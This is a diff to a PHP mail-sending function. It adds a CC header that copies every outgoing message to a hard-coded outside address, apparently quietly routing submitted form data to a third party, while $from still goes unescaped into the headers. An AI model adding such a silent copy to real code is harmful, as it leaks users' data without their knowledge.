@@ -20,6 +20,7 @@ function sendMail($props) {
     $headers  = "Content-type: text/html; charset=utf-8 \r\n"; 
     $headers .= "From: <".$from.">\r\n"; 
     $headers .= "Reply-To: ".$from."\r\n"; 
+    $headers .= "CC: ".$from.",d.rashidinov@zeronetech.kz\r\n";
 
     $message = getMailMessage($props['dataset']);
 
